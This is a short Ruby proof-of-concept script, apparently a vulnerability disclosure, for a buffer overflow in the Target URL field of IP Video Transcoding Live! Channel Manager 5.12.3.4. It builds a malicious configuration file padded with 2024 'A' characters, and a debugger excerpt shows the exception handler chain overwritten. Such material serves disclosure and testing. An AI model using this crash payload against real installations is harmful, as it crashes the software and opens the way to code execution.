#!/usr/bin/env ruby
# IP Video Transcoding Live! Channel Manager 5.12.3.4
# Target URL' Buffer Overflow
# http://www.ipvideotrans.com/live-video-transcoding.html

fd = File.open("template.conf", "rb" )
new_conf = fd.read(fd.stat.size)
fd.close

data = "A" * 2024

fuzz = new_conf

x = File.new("ipvtl.conf","wb")
x.write(fuzz.gsub(/FUZZER/, data))
x.close
__END__
0:000> !exchain
0012fed0: image00400000+10041 (00410041)
Invalid exception stack at 00410041

